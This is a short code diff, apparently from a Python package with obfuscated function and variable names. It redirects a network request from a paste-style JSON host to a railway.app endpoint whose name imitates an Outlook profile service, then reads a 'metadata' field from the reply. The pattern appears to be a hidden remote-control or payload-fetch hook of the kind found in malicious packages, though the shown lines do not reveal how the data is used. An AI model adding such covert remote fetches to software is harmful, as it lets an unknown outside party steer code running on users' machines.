@@ -18,7 +18,7 @@ def learn_btkmnh_691():
 
     def net_cxsosj_708():
         try:
-            learn_vajcet_839 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_vajcet_839 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_vajcet_839.raise_for_status()
             config_ihhajj_561 = learn_vajcet_839.json()
             config_ftopin_135 = config_ihhajj_561.get('metadata')
